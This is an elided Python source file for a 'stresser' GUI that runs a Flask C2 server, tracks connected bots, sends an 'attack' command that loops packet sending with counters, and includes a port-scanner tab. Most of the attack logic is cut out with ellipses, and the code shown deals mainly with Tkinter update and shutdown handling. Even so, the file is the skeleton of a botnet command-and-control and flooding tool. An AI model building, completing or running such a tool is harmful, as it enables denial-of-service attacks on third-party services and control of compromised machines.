# simplified_stresser_2.py (Further improved for responsiveness)
...
import logging
import sys # Needed for redirector fix
...
def run_c2_server():
    ...
    try:
        ...
        # Disable reloader for threading and prevent blocking issues
...
class SimplifiedStresserGUI:
    ...
    def __init__(self, root):
        ...
        # Allow the window to be closed gracefully
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.bot_count = 0
        self.bot_list_update_job = None # Keep track of the scheduled update job
        self.setup_ui()
    ...
    def setup_ui(self):
        ...
        self.tab_pen_test = ttk.Frame(self.notebook) # Port Scanner Tab
        ...
        self.notebook.add(self.tab_pen_test, text='Port Scanner') # Add Port Scanner Tab
    ...
    def update_status(self, message):
        ...
        # self.root.update_idletasks() # Often not necessary and can sometimes cause issues if called too frequently
    ...
    def setup_main_tab(self):
        ...
        # Redirect print statements to log_text (FIXED and improved)
        class TextRedirector:
            def __init__(self, widget, gui_root):
                self.widget = widget
                self.gui_root = gui_root # Keep a reference to the root

            def write(self, str):
                # Check if widget still exists before updating
                try:
                    if self.widget and self.widget.winfo_exists():
                        # Schedule the update on the main thread to be safer
            ...
            def _update_widget(self, str):
                """Helper to perform the actual widget update."""
                try:
                    if self.widget and self.widget.winfo_exists():
                    ...
                    pass # Ignore errors during update if widget disappears

            def flush(self):
                pass # Needed for file-like object

        # Pass the root instance to the redirector
                ...
                if cmd == "attack":
                    ...
                    while ATTACK_RUNNING:
                        try:
                            ...
                            PACKETS_SENT += 1
                            # Update GUI counter (thread-safe) - Only schedule if root likely exists
                            try:
                                if self.root and self.root.winfo_exists():
                                    self.root.after(0, self._safe_update_packet_var, str(PACKETS_SENT))
                            except tk.TclError:
                                pass # Ignore if root is gone
                        except Exception as e:
                            FAILED_PACKETS += 1
    ...
    def schedule_bot_list_update(self):
        """Schedules the next bot list update."""
        # Cancel any previously scheduled update to prevent duplicates
        if self.bot_list_update_job:
            self.root.after_cancel(self.bot_list_update_job)
        # Schedule the next update if the root window exists
        try:
            if self.root and self.root.winfo_exists():
                self.bot_list_update_job = self.root.after(5000, self.update_bot_list)
        except tk.TclError:
            pass # Root destroyed, stop scheduling

    def update_bot_list(self):
        """Updates the bot list Treeview."""
        try:
            ...
            print(f"[GUI ERROR] Updating bot list: {e}") # Log errors in GUI update
        finally:
            # Reschedule the next update, regardless of success/failure
            # This ensures the loop continues even if one update fails
            self.schedule_bot_list_update()
    ...
    def on_closing(self):
        ...
        # Cancel the scheduled bot list update job
        if self.bot_list_update_job:
            self.root.after_cancel(self.bot_list_update_job)
        # Stop the C2 server flag (Flask stop is still tricky)
        global C2_SERVER_RUNNING
        C2_SERVER_RUNNING = False
...
if __name__ == "__main__":
    try:
        ...
        root.mainloop()
        # The on_closing handler should manage cleanup now
        # print("[INFO] Application closed.") # Handled by on_closing
    except Exception as e:
